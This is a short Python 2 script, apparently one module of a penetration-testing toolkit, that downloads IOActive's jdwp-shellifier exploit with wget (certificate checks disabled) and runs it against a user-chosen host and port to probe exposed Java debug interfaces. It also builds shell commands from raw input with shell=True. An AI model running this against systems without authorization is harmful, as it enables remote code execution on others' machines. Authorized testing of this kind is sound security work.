#!/usr/bin/env python
# path14: testing jwdp
# 
# detailed tutorial:
#   https://www.youtube.com/watch?v=VNj46axj9qM
#  
# current:
#   - gotleak
#  

# --- imports ---
import subprocess
import re
import requests

# --- super colours ---
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'



def gotleak():
  print OKGREEN + '  [+] path 14: get some info from unauthorized JWDP' + ENDC
  print ''
  print '          based on: https://github.com/IOActive/jdwp-shellifier\n'
  # ...

  
  grab_or_not = raw_input('      using tool [local/wget]: ')
  print '\n' + ENDC

  pocpath = '/tmp/jdwp-shellifier.py' # for 'default'

  if grab_or_not == 'wget':
    # based on: 
    getpoc = 'wget --no-check-certificate https://raw.githubusercontent.com/IOActive/jdwp-shellifier/master/jdwp-shellifier.py -O ' + pocpath
    subprocess.call([ getpoc ],shell=True)
    print '' + OKGREEN
    print '      poc should be ready to configure...' + ENDC

  elif grab_or_not == 'local':
    print '      [1] /tmp/jdwp-shellifier.py ("default")'
    print '      [2] < /full/path2/po.c >'

    choice = raw_input('      [1/2]: ? ')
    if choice == '1':
      pocpath = '/tmp/jdwp-shellifier.py'

    elif choice == '2':
      print BOLD
      pocpath = raw_input('  type full path to jdwp-shellifier.py >> ')
      print ENDC

  print BOLD
  target = raw_input('    set target: ')
  port = raw_input('    set port: ')
  logfile = '/tmp/jwdp-enum-' + target + '.log'
  print ENDC

  #1: runjwp = 'python ' + pocpath + ' -port ' + port + ' -t ' + target  
  #2:
  runjwp = 'python ' + pocpath + ' --port ' + port
  runjwp += ' -t ' + target + ' --break-on "java.lang.String.indexOf"'
  runjwp += ' > ' + logfile

  subprocess.call([ runjwp ], shell=True)

  print OKGREEN + '\n  [+] poc finished, checking results:' + ENDC
  
  ####

  print '' + BOLD
  print '  [+] path 14: unauthorized JWDP check - finished.' + ENDC
  print ''


